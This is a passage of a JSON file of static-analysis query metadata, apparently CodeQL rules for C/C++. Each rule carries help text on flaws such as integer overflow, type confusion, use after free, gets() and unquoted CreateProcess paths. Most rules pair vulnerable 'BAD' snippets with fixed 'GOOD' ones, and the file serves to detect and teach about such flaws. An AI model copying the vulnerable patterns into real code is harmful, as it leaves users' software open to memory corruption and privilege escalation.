    "help": "# Operator Find Incorrectly Used Exceptions\nFinding places for the dangerous use of exceptions.\n\n\n## Example\nThe following example demonstrates erroneous and fixed methods for using exceptions.\n\n\n```cpp\n...\nthrow (\"my exception!\",546); // BAD\n...\nthrow errorFunc(\"my exception!\",546); // GOOD \n...\nstd::runtime_error(\"msg error\"); // BAD\n...\nthrow std::runtime_error(\"msg error\"); // GOOD\n...\n\n```\n\n## References\n* CERT CPP Coding Standard: [DCL57-CPP. Do not let exceptions escape from destructors or deallocation functions](https://wiki.sei.cmu.edu/confluence/display/cplusplus/DCL57-CPP.+Do+not+let+exceptions+escape+from+destructors+or+deallocation+functions).\n* Common Weakness Enumeration: [CWE-703](https://cwe.mitre.org/data/definitions/703.html).\n* Common Weakness Enumeration: [CWE-248](https://cwe.mitre.org/data/definitions/248.html).\n* Common Weakness Enumeration: [CWE-390](https://cwe.mitre.org/data/definitions/390.html).\n"
  },
  "cpp/memset-may-be-deleted": {
    "name": "Call to `memset` may be deleted",
    "description": "Using the `memset` function to clear private data in a variable that has no subsequent use can make information-leak vulnerabilities easier to exploit because the compiler can remove the call.",
    "kind": "problem",
    "id": "cpp/memset-may-be-deleted",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-14"
    ],
    "filename": "5e4ff345-MemsetMayBeDeleted",
    "language": "cpp",
    "help": "# Call to `memset` may be deleted\nCalling `memset` or `bzero` on a buffer to clear its contents may get optimized away by the compiler if the buffer is not subsequently used. This is not desirable behavior if the buffer contains sensitive data that could somehow be retrieved by an attacker.\n\n\n## Recommendation\nUse `memset_s` (from C11) instead of `memset`, as `memset_s` will not get optimized away. Alternatively use platform-supplied functions such as `SecureZeroMemory` or `bzero_explicit` that make the same guarantee. Passing the `-fno-builtin-memset` option to the GCC/Clang compiler usually also prevents the optimization. Finally, you can use the public-domain `secure_memzero` function (see references below). This function, however, is not guaranteed to work on all platforms and compilers.\n\n\n## Example\nThe following program fragment uses `memset` to erase sensitive information after it is no longer needed:\n\n\n```c\nchar password[MAX_PASSWORD_LENGTH];\n// read and verify password\nmemset(password, 0, MAX_PASSWORD_LENGTH);\n\n```\nBecause of dead store elimination, the call to `memset` may be removed by the compiler (since the buffer is not subsequently used), resulting in potentially sensitive data remaining in memory.\n\nThe best solution to this problem is to use the `memset_s` function instead of `memset`:\n\n\n```c\nchar password[MAX_PASSWORD_LENGTH];\n// read and verify password\nmemset_s(password, MAX_PASSWORD_LENGTH, 0, MAX_PASSWORD_LENGTH);\n\n```\n\n## References\n* CERT C Coding Standard: [MSC06-C. Beware of compiler optimizations](https://wiki.sei.cmu.edu/confluence/display/c/MSC06-C.+Beware+of+compiler+optimizations).\n* USENIX: The Advanced Computing Systems Association: [Dead Store Elimination (Still) Considered Harmfuls](https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-yang.pdf)\n* Common Weakness Enumeration: [CWE-14](https://cwe.mitre.org/data/definitions/14.html).\n"
  },
  "cpp/if-statement-addition-overflow": {
    "name": "Integer addition may overflow inside if statement",
    "description": "Writing 'if (a+b>c) a=c-b' incorrectly implements 'a = min(a,c-b)' if 'a+b' overflows. This integer overflow is the root cause of the buffer overflow in the SHA-3 reference implementation (CVE-2022-37454).",
    "kind": "problem",
    "problem.severity": "warning",
    "id": "cpp/if-statement-addition-overflow",
    "tags:": "experimental correctness security external/cwe/cwe-190",
    "filename": "97b3e969-IfStatementAdditionOverflow",
    "language": "cpp",
    "help": "# Integer addition may overflow inside if statement\nDetects `if (a+b>c) a=c-b`, which incorrectly implements `a = min(a,c-b)` if `a+b` overflows.\n\nAlso detects variants such as `if (b+a>c) a=c-b` (swapped terms in addition), `if (a+b>c) { a=c-b }` (assignment inside block), `c<a+b` (swapped operands), and `>=`, `<`, `<=` instead of `>` (all operators).\n\nThis integer overflow is the root cause of the buffer overflow in the SHA-3 reference implementation (CVE-2022-37454).\n\n\n## Recommendation\nReplace by `if (a>c-b) a=c-b`. This avoids the overflow and makes it easy to see that `a = min(a,c-b)`.\n\n\n## References\n* CVE-2022-37454: [The Keccak XKCP SHA-3 reference implementation before fdc6fef has an integer overflow and resultant buffer overflow that allows attackers to execute arbitrary code or eliminate expected cryptographic properties. This occurs in the sponge function interface.](https://nvd.nist.gov/vuln/detail/CVE-2022-37454)\n* GitHub Advisory Database: [CVE-2022-37454: Buffer overflow in sponge queue functions](https://github.com/advisories/GHSA-6w4m-2xhg-2658)\n"
  },
  "cpp/type-confusion": {
    "name": "Type confusion",
    "description": "Casting a value to an incompatible type can lead to undefined behavior.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "cpp/type-confusion",
    "tags": [
      "security",
      "external/cwe/cwe-843"
    ],
    "filename": "0f19884e-TypeConfusion",
    "language": "cpp",
    "help": "# Type confusion\nCertain casts in C and C++ place no restrictions on the target type. For example, C style casts such as `(MyClass*)p` allows the programmer to cast any pointer `p` to an expression of type `MyClass*`. If the runtime type of `p` turns out to be a type that's incompatible with `MyClass`, this results in undefined behavior.\n\n\n## Recommendation\nIf possible, use `dynamic_cast` to safely cast between polymorphic types. If `dynamic_cast` is not an option, use `static_cast` to restrict the kinds of conversions that the compiler is allowed to perform. If C++ style casts is not an option, carefully check that all casts are safe.\n\n\n## Example\nConsider the following class hierachy where we define a base class `Shape` and two derived classes `Circle` and `Square` that are mutually incompatible:\n\n\n```cpp\nstruct Shape {\n  virtual ~Shape();\n\n  virtual void draw() = 0;\n};\n\nstruct Circle : public Shape {\n  Circle();\n\n  void draw() override {\n    /* ... */\n  }\n\n  int getRadius();\n};\n\nstruct Square : public Shape {\n  Square();\n\n  void draw() override {\n    /* ... */\n  }\n\n  int getLength();\n};\n\n```\nThe following code demonstrates a type confusion vulnerability where the programmer assumes that the runtime type of `p` is always a `Square`. However, if `p` is a `Circle`, the cast will result in undefined behavior.\n\n\n```cpp\nvoid allocate_and_draw_bad() {\n  Shape* shape = new Circle;\n  // ...\n  // BAD: Assumes that shape is always a Square\n  Square* square = static_cast<Square*>(shape);\n  int length = square->getLength();\n}\n```\nThe following code fixes the vulnerability by using `dynamic_cast` to safely cast between polymorphic types. If the cast fails, `dynamic_cast` returns a null pointer, which can be checked for and handled appropriately.\n\n\n```cpp\nvoid allocate_and_draw_good() {\n  Shape* shape = new Circle;\n  // ...\n  // GOOD: Dynamically checks if shape is a Square\n  Square* square = dynamic_cast<Square*>(shape);\n  if(square) {\n    int length = square->getLength();\n  } else {\n    // handle error\n  }\n}\n```\n\n## References\n* Microsoft Learn: [Type conversions and type safety](https://learn.microsoft.com/en-us/cpp/cpp/type-conversions-and-type-safety-modern-cpp).\n* Common Weakness Enumeration: [CWE-843](https://cwe.mitre.org/data/definitions/843.html).\n"
  },
  "cpp/lock-order-cycle": {
    "name": "Cyclic lock order dependency",
    "description": "Locking mutexes in different orders in different threads can cause deadlock.",
    "kind": "problem",
    "id": "cpp/lock-order-cycle",
    "problem.severity": "error",
    "security-severity": 5.0,
    "tags": [
      "security",
      "external/cwe/cwe-764",
      "external/cwe/cwe-833"
    ],
    "filename": "aeb98138-LockOrderCycle",
    "language": "cpp",
    "help": "# Cyclic lock order dependency\nDeadlock can occur when two or more threads each attempt to lock multiple mutexes, but not in the same order. A famous example of this is the \"Dining Philosophers Problem\" (see references below). In this example, deadlock occurs when all five philosophers simultaneously pick up the fork to their left because then none of them can pick up the fork to their right. A simple solution is to assign an order to the mutexes. If the philosophers always pick up the lower numbered fork first, rather than the fork to their left, then deadlock cannot occur.\n\nIn general, we can build a graph of the order in which the mutexes are locked. For example, if one of the threads locks mutex A first and B second (while A is still locked), then we add a graph edge from A to B. If the resulting graph contains a cycle then there is a possibility of deadlock. The graph for the dining philosophers example contains a cycle because each philosopher creates a graph edge from their left fork to their right fork.\n\n\n## Recommendation\nIf multiple mutexes need to be locked simultaneously, then make sure that all threads lock them in the same order.\n\n\n## Example\nIn this example, `f1` locks `mtx1` first and `mtx2` second, but `f2` locks them in the opposite order. If `f1` and `f2` are run simultaneously in separate threads then they could cause a deadlock.\n\n\n```cpp\nstd::mutex mtx1;\nstd::mutex mtx2;\n\nvoid f1() {\n  // GOOD: lock mtx1 before mtx2.\n  mtx1.lock();\n  mtx2.lock();\n  printf(\"f1\");\n  mtx2.unlock();\n  mtx1.unlock();\n}\n\nvoid f2() {\n  // BAD: lock mtx2 before mtx1.\n  mtx2.lock();\n  mtx1.lock();\n  printf(\"f2\");\n  mtx1.unlock();\n  mtx2.unlock();\n}\n\n```\n\n## References\n* Dijkstra, E. W., *EWD-310: [Hierarchical Ordering of Sequential Processes](http://www.cs.utexas.edu/users/EWD/ewd03xx/EWD310.PDF)*. E. W. Dijkstra Archive. Center for American History, University of Texas at Austin.\n* Hoare, C. A. R., *[Communicating Sequential Processes](http://www.usingcsp.com/cspbook.pdf)*, Section 2.5 - 'Example: The Dining Philosophers,' p. 55, 2004 (originally published in 1985 by Prentice Hall International).\n* Common Weakness Enumeration: [CWE-764](https://cwe.mitre.org/data/definitions/764.html).\n* Common Weakness Enumeration: [CWE-833](https://cwe.mitre.org/data/definitions/833.html).\n"
  },
  "cpp/uncontrolled-arithmetic": {
    "name": "Uncontrolled data in arithmetic expression",
    "description": "Arithmetic operations on uncontrolled data that is not validated can cause overflows.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.6,
    "precision": "high",
    "id": "cpp/uncontrolled-arithmetic",
    "tags": [
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-191"
    ],
    "filename": "d81e4b10-ArithmeticUncontrolled",
    "language": "cpp",
    "help": "# Uncontrolled data in arithmetic expression\nPerforming calculations on uncontrolled data can result in integer overflows unless the input is validated.\n\nIf the data is not under your control, and can take extremely large values, even arithmetic operations that would usually result in a small change in magnitude may result in overflows.\n\n\n## Recommendation\nAlways guard against overflow in arithmetic operations on uncontrolled data by doing one of the following:\n\n* Validate the data.\n* Define a guard on the arithmetic expression, so that the operation is performed only if the result can be known to be less than, or equal to, the maximum value for the type, for example `INT_MAX`.\n* Use a wider type, so that larger input values do not cause overflow.\n\n## Example\nIn this example, a random integer is generated. Because the value is not controlled by the programmer, it could be extremely large. Performing arithmetic operations on this value could therefore cause an overflow. To avoid this happening, the example shows how to perform a check before performing an arithmetic operation.\n\n\n```c\nint main(int argc, char** argv) {\n\tint i = rand();\n\t// BAD: potential overflow\n\tint j = i + 1000;\n\n\t// ...\n\n\tint n = rand();\n\tint k;\n\t// GOOD: use a guard to prevent overflow\n\tif (n < INT_MAX-1000)\n\t\tk = n + 1000;\n\telse\n\t\tk = INT_MAX;\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-191](https://cwe.mitre.org/data/definitions/191.html).\n"
  },
  "cpp/use-of-string-after-lifetime-ends": {
    "name": "Use of string after lifetime ends",
    "description": "If the value of a call to 'c_str' outlives the underlying object it may lead to unexpected behavior.",
    "kind": "problem",
    "precision": "high",
    "id": "cpp/use-of-string-after-lifetime-ends",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-416",
      "external/cwe/cwe-664"
    ],
    "filename": "dbf806fe-UseOfStringAfterLifetimeEnds",
    "language": "cpp",
    "help": "# Use of string after lifetime ends\nCalling `c_str` on a `std::string` object returns a pointer to the underlying character array. When the `std::string` object is destroyed, the pointer returned by `c_str` is no longer valid. If the pointer is used after the `std::string` object is destroyed, then the behavior is undefined.\n\nTypically, this problem occurs when a `std::string` is returned by a function call (or overloaded operator) by value, and the result is not immediately stored in a variable by value or reference in a way that extends the lifetime of the temporary object. The resulting temporary `std::string` object is destroyed at the end of the containing expression statement, along with any memory returned by a call to `c_str`.\n\n\n## Recommendation\nEnsure that the pointer returned by `c_str` does not outlive the underlying `std::string` object.\n\n\n## Example\nThe following example concatenates two `std::string` objects, and then converts the resulting string to a C string using `c_str` so that it can be passed to the `work` function. However, the underlying `std::string` object that represents the concatenated string is destroyed as soon as the call to `c_str` returns. This means that `work` is given a pointer to invalid memory.\n\n\n```cpp\n#include <string>\nvoid work(const char*);\n\n// BAD: the concatenated string is deallocated when `c_str` returns. So `work`\n// is given a pointer to invalid memory.\nvoid work_with_combined_string_bad(std::string s1, std::string s2) {\n  const char* combined_string = (s1 + s2).c_str();\n  work(combined_string);\n}\n```\nThe following example fixes the above code by ensuring that the pointer returned by the call to `c_str` does not outlive the underlying `std::string` objects. This ensures that the pointer passed to `work` points to valid memory.\n\n\n```cpp\n#include <string>\nvoid work(const char*);\n\n// GOOD: the concatenated string outlives the call to `work`. So the pointer\n// obtainted from `c_str` is valid.\nvoid work_with_combined_string_good(std::string s1, std::string s2) {\n  auto combined_string = s1 + s2;\n  work(combined_string.c_str());\n}\n```\n\n## References\n* [MEM50-CPP. Do not access freed memory](https://wiki.sei.cmu.edu/confluence/display/cplusplus/MEM50-CPP.+Do+not+access+freed+memory).\n* Microsoft Learn: [Temporary objects](https://learn.microsoft.com/en-us/cpp/cpp/temporary-objects?view=msvc-170).\n* cppreference.com: [Lifetime of a temporary](https://en.cppreference.com/w/cpp/language/reference_initialization#Lifetime_of_a_temporary).\n* Common Weakness Enumeration: [CWE-416](https://cwe.mitre.org/data/definitions/416.html).\n* Common Weakness Enumeration: [CWE-664](https://cwe.mitre.org/data/definitions/664.html).\n"
  },
  "cpp/suspicious-pointer-scaling-void": {
    "name": "Suspicious pointer scaling to void",
    "description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "cpp/suspicious-pointer-scaling-void",
    "tags": [
      "security",
      "external/cwe/cwe-468"
    ],
    "filename": "94152eed-IncorrectPointerScalingVoid",
    "language": "cpp",
    "help": "# Suspicious pointer scaling to void\nCasting arbitrary pointers into `void*` and then accessing their contents should be done with care. The results may not be portable.\n\nThis query finds pointer arithmetic expressions where a pointer to `void` (or similar) is then cast to another type and dereferenced.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `void*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n1. If pointer arithmetic must be done with a single-byte width, prefer `char *` to `void *`, as pointer arithmetic on `void *` is a nonstandard GNU extension.\n\n## Example\n\n```cpp\nchar example1(int i) {\n  int intArray[5] = { 1, 2, 3, 4, 5 };\n  void *voidPointer = (void *)intArray;\n  // BAD: the pointer arithmetic uses type void*, so the offset\n  // is not scaled by sizeof(int).\n  return *(voidPointer + i);\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n"
  },
  "cpp/open-call-with-mode-argument": {
    "name": "File opened with O_CREAT flag but without mode argument",
    "description": "Opening a file with the O_CREAT flag but without mode argument reads arbitrary bytes from the stack.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "cpp/open-call-with-mode-argument",
    "tags": [
      "security",
      "external/cwe/cwe-732"
    ],
    "filename": "71e366af-OpenCallMissingModeArgument",
    "language": "cpp",
    "help": "# File opened with O_CREAT flag but without mode argument\nWhen opening a file with the `O_CREAT` or `O_TMPFILE` flag, the `mode` must be supplied. If the `mode` argument is omitted, some arbitrary bytes from the stack will be used as the file mode. This leaks some bits from the stack into the permissions of the file.\n\n\n## Recommendation\nThe `mode` must be supplied when `O_CREAT` or `O_TMPFILE` is specified.\n\n\n## Example\nThe first example opens a file with the `O_CREAT` flag without supplying the `mode` argument. In this case arbitrary bytes from the stack will be used as `mode` argument. The second example correctly supplies the `mode` argument and creates a file that is user readable and writable.\n\n\n```c\nint open_file_bad() {\n\t// BAD - this uses arbitrary bytes from the stack as mode argument\n        return open(FILE, O_CREAT)\n}\n\nint open_file_good() {\n\t// GOOD - the mode argument is supplied\n        return open(FILE, O_CREAT, S_IRUSR | S_IWUSR)\n}\n\n```\n"
  },
  "cpp/unclear-array-index-validation": {
    "name": "Unclear validation of array index",
    "description": "Accessing an array without first checking that the index is within the bounds of the array can cause undefined behavior and can also be a security risk.",
    "kind": "path-problem",
    "id": "cpp/unclear-array-index-validation",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "low",
    "tags": [
      "security",
      "external/cwe/cwe-129"
    ],
    "filename": "e026f47b-ImproperArrayIndexValidation",
    "language": "cpp",
    "help": "# Unclear validation of array index\nC and C++ do not have built-in bounds checking for array indexing expressions such as `x[i]`. If `i` is out of bounds then the program will read/write whatever data happens to be at that address. An attacker who is able to control the value of `i` might be able to read or modify data which they are not authorized to access.\n\n\n## Recommendation\nAlways check the bounds of array indexing expressions, especially if the index value is derived from user-controlled data.\n\n\n## Example\nIn this example, a string is read from a socket and converted to an `int`. This `int` is then used to index the `data` array. Because the index value is a user-controlled value, it could be out of bounds.\n\n\n```c\nint example(int socket, int data[]) {\n  char inputBuffer[CHAR_ARRAY_SIZE];\n  int recvResult;\n  int i;\n\n  recvResult = recv(socket, inputBuffer, CHAR_ARRAY_SIZE - 1, 0);\n  if (recvResult < 0)\n  {\n    return -1;\n  }\n\n  inputBuffer[recvResult] = '\\0';\n  i = atoi(inputBuffer);\n\n  // BAD: i has not been validated.\n  return data[i];\n}\n\n```\nBelow, the problem has been fixed by adding a guard:\n\n\n```c\nint example(int socket, int data[], int ndata) {\n  char inputBuffer[CHAR_ARRAY_SIZE];\n  int recvResult;\n  int i;\n\n  recvResult = recv(socket, inputBuffer, CHAR_ARRAY_SIZE - 1, 0);\n  if (recvResult < 0)\n  {\n    return -1;\n  }\n\n  inputBuffer[recvResult] = '\\0';\n  i = atoi(inputBuffer);\n\n  if (i < 0 || ndata <= i) {\n    return -1;\n  }\n\n  // GOOD: i has been validated.\n  return data[i];\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-129](https://cwe.mitre.org/data/definitions/129.html).\n"
  },
  "cpp/unsafe-create-process-call": {
    "name": "NULL application name with an unquoted path in call to CreateProcess",
    "description": "Calling a function of the CreateProcess* family of functions, where the path contains spaces, introduces a security vulnerability.",
    "id": "cpp/unsafe-create-process-call",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "msrc.severity": "important",
    "tags": [
      "security",
      "external/cwe/cwe-428"
    ],
    "filename": "b9a1cc59-UnsafeCreateProcessCall",
    "language": "cpp",
    "help": "# NULL application name with an unquoted path in call to CreateProcess\nThis query indicates that there is a call to a function of the `CreateProcess*` family of functions, which introduces a security vulnerability.\n\n\n## Recommendation\nDo not use `NULL` for the `lpApplicationName` argument to the `CreateProcess*` function.\n\nIf you pass `NULL` for `lpApplicationName`, use quotation marks around the executable path in `lpCommandLine`.\n\n\n## Example\nIn the following example, `CreateProcessW` is called with a `NULL` value for `lpApplicationName`, and the value for `lpCommandLine` that represent the application path is not quoted and has spaces in it.\n\nIf an attacker has access to the file system, they can elevate privileges by creating a file such as `C:\\Program.exe` that will be executed instead of the intended application.\n\n\n```cpp\nSTARTUPINFOW si;\nPROCESS_INFORMATION pi;\n\n// ... \n\nCreateProcessW(                           // BUG\n    NULL,                                 // lpApplicationName\n    (LPWSTR)L\"C:\\\\Program Files\\\\MyApp\",  // lpCommandLine\n    NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);\n\n// ...\n```\nTo fix this issue, specify a valid string for `lpApplicationName`, or quote the path for `lpCommandLine`. For example:\n\n`(LPWSTR)L\"\\\"C:\\\\Program Files\\\\MyApp\\\"\", // lpCommandLine`\n\n\n## References\n* [CreateProcessA function (Microsoft documentation).](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa)\n* [CreateProcessW function (Microsoft documentation).](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessw)\n* [CreateProcessAsUserA function (Microsoft documentation).](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)\n* [CreateProcessAsUserW function (Microsoft documentation).](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw)\n* [CreateProcessWithLogonW function (Microsoft documentation).](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw)\n* [CreateProcessWithTokenW function (Microsoft documentation).](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw)\n* Common Weakness Enumeration: [CWE-428](https://cwe.mitre.org/data/definitions/428.html).\n"
  },
  "cpp/suspicious-pointer-scaling": {
    "name": "Suspicious pointer scaling",
    "description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "cpp/suspicious-pointer-scaling",
    "tags": [
      "security",
      "external/cwe/cwe-468"
    ],
    "filename": "94152eed-IncorrectPointerScaling",
    "language": "cpp",
    "help": "# Suspicious pointer scaling\nPointer arithmetic in C and C++ is automatically scaled according to the size of the data type. For example, if the type of `p` is `T*` and `sizeof(T) == 4` then the expression `p+1` adds 4 bytes to `p`. This can cause a buffer overflow condition if the programmer forgets that they are adding a multiple of `sizeof(T)`, rather than a number of bytes.\n\nThis query finds pointer arithmetic expressions where it appears likely that the programmer has forgotten that the offset is automatically scaled.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `int*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nint example1(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // BAD: the offset is already automatically scaled by sizeof(int),\n  // so this code will compute the wrong offset.\n  return *(intPointer + (i * sizeof(int)));\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n"
  },
  "cpp/linux-kernel-double-fetch-vulnerability": {
    "name": "Linux kernel double-fetch vulnerability detection",
    "description": "Double-fetch is a very common vulnerability pattern in linux kernel, attacker can exploit double-fetch issues to obtain root privilege. Double-fetch is caused by fetching data from user mode by calling copy_from_user twice, CVE-2016-6480 is quite a good example for your information.",
    "kind": "problem",
    "id": "cpp/linux-kernel-double-fetch-vulnerability",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-362"
    ],
    "filename": "2698af8f-double-fetch",
    "language": "cpp"
  },
  "cpp/dangerous-function-overflow": {
    "name": "Use of dangerous function",
    "description": "Use of a standard library function that does not guard against buffer overflow.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 10.0,
    "precision": "very-high",
    "id": "cpp/dangerous-function-overflow",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-242",
      "external/cwe/cwe-676"
    ],
    "filename": "122e8bb7-DangerousFunctionOverflow",
    "language": "cpp",
    "help": "# Use of dangerous function\nThis rule finds calls to the `gets` function, which is dangerous and should not be used. See **Related rules** below for rules that identify other dangerous functions.\n\nThe `gets` function is one of the vulnerabilities exploited by the Internet Worm of 1988, one of the first computer worms to spread through the Internet. The `gets` function provides no way to limit the amount of data that is read and stored, so without prior knowledge of the input it is impossible to use it safely with any size of buffer.\n\n\n## Recommendation\nReplace calls to `gets` with `fgets`, specifying the maximum length to copy. This will prevent the buffer overflow.\n\n\n## Example\nThe following example gets a string from standard input in two ways:\n\n\n```c\n#define BUFFERSIZE (1024)\n\n// BAD: using gets\nvoid echo_bad() {\n    char buffer[BUFFERSIZE];\n    gets(buffer);\n    printf(\"Input was: '%s'\\n\", buffer);\n}\n\n// GOOD: using fgets\nvoid echo_good() {\n    char buffer[BUFFERSIZE];\n    fgets(buffer, BUFFERSIZE, stdin);\n    printf(\"Input was: '%s'\\n\", buffer);\n}\n\n```\nThe first version uses `gets` and will overflow if the input is longer than the buffer. The second version of the code uses `fgets` and will not overflow, because the amount of data written is limited by the length parameter.\n\n\n## Related rules\nOther dangerous functions identified by CWE-676 (\"Use of Potentially Dangerous Function\") include `strcpy` and `strcat`. Use of these functions is highlighted by rules for the following CWEs:\n\n* [CWE-120 Classic Buffer Overflow](https://cwe.mitre.org/data/definitions/120.html).\n* [CWE-131 Incorrect Calculation of Buffer Size](https://cwe.mitre.org/data/definitions/131.html).\n\n## References\n* Wikipedia: [Morris worm](http://en.wikipedia.org/wiki/Morris_worm).\n* E. Spafford. *The Internet Worm Program: An Analysis*. Purdue Technical Report CSD-TR-823, [(online)](http://www.textfiles.com/100/tr823.txt), 1988.\n* Common Weakness Enumeration: [CWE-242](https://cwe.mitre.org/data/definitions/242.html).\n* Common Weakness Enumeration: [CWE-676](https://cwe.mitre.org/data/definitions/676.html).\n"
  },
  "cpp/integer-overflow-tainted": {
    "name": "Potential integer arithmetic overflow",
    "description": "A user-controlled integer arithmetic expression that is not validated can cause overflows.",
    "kind": "problem",
    "id": "cpp/integer-overflow-tainted",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "low",
    "tags": [
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-197",
      "external/cwe/cwe-681"
    ],
    "filename": "d81e4b10-IntegerOverflowTainted",
    "language": "cpp",
    "help": "# Potential integer arithmetic overflow\nPerforming calculations on user-controlled data can result in integer overflows unless the input is validated.\n\nInteger overflow occurs when the result of an arithmetic expression is too large to be represented by the (integer) output type of the expression. For example, if the result of the expression is 200, but the output type is a signed 8-bit integer, then overflow occurs because the largest value that can be represented is 127. The behavior of overflow is implementation defined, but the most common implementation is two's complement arithmetic, in which case the result is -56. Overflow can cause unexpected results, particularly when a large value overflows and the result is negative. It can also pose a security risk if the value of the expression is controllable by user, because it could enable an attacker to deliberately cause an overflow.\n\nNegative integer overflow is another form of integer overflow, in which a negative result cannot be represented in the output type.\n\n\n## Recommendation\nAlways guard against overflow in arithmetic operations on user-controlled data by doing one of the following:\n\n* Validate the user input.\n* Define a guard on the arithmetic expression, so that the operation is performed only if the result can be known to be less than, or equal to, the maximum value for the type, for example `INT_MAX`.\n* Use a wider type, so that larger input values do not cause overflow.\n\n## Example\nIn this example, a value is read from standard input into an `int`. Because the value is a user-controlled value, it could be extremely large. Performing arithmetic operations on this value could therefore cause an overflow. To avoid this happening, the example shows how to perform a check before performing a multiplication.\n\n\n```c\nint main(int argc, char** argv) {\n\tchar buffer[20];\n\tfgets(buffer, 20, stdin);\n\n\tint num = atoi(buffer);\n\t// BAD: may overflow if input is very large\n\tint scaled = num + 1000;\n\n\t// ...\n\n\tint num2 = atoi(buffer);\n\tint scaled2;\n\t// GOOD: use a guard to prevent overflow\n\tif (num2 < INT_MAX-1000)\n\t\tscaled2 = num2 + 1000;\n\telse\n\t\tscaled2 = INT_MAX;\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-197](https://cwe.mitre.org/data/definitions/197.html).\n* Common Weakness Enumeration: [CWE-681](https://cwe.mitre.org/data/definitions/681.html).\n"
  },
  "cpp/hresult-boolean-conversion": {
    "name": "Cast between HRESULT and a Boolean type",
    "description": "Casting an HRESULT to/from a Boolean type and then using it in a test expression will yield an incorrect result because success (S_OK) in HRESULT is indicated by a value of 0.",
    "kind": "problem",
    "id": "cpp/hresult-boolean-conversion",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-253"
    ],
    "filename": "88fc4bd9-HResultBooleanConversion",
    "language": "cpp",
    "help": "# Cast between HRESULT and a Boolean type\nThis query indicates that an `HRESULT` is being cast to a Boolean type or vice versa.\n\nThe typical success value (`S_OK`) of an `HRESULT` equals 0. However, 0 indicates failure for a Boolean type.\n\nCasting an `HRESULT` to a Boolean type and then using it in a test expression will yield an incorrect result.\n\n\n## Recommendation\nTo check if a call that returns an `HRESULT` succeeded use the `FAILED` macro.\n\n\n## Example\nIn the following example, `HRESULT` is used in a test expression incorrectly as it may yield an incorrect result.\n\n\n```cpp\nLPMALLOC pMalloc;\nHRESULT hr = CoGetMalloc(1, &pMalloc);\n\nif (!hr)\n{\n    // code ...\n}\n\n```\nTo fix this issue, use the `FAILED` macro in the test expression.\n\n\n## References\n* Common Weakness Enumeration: [CWE-253](https://cwe.mitre.org/data/definitions/253.html).\n"
  },
  "cpp/cleartext-transmission": {
    "name": "Cleartext transmission of sensitive information",
    "description": "Transmitting sensitive information across a network in cleartext can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "cpp/cleartext-transmission",
    "tags": [
      "security",
      "external/cwe/cwe-319",
      "external/cwe/cwe-359"
    ],
    "filename": "8538808f-CleartextTransmission",
    "language": "cpp",
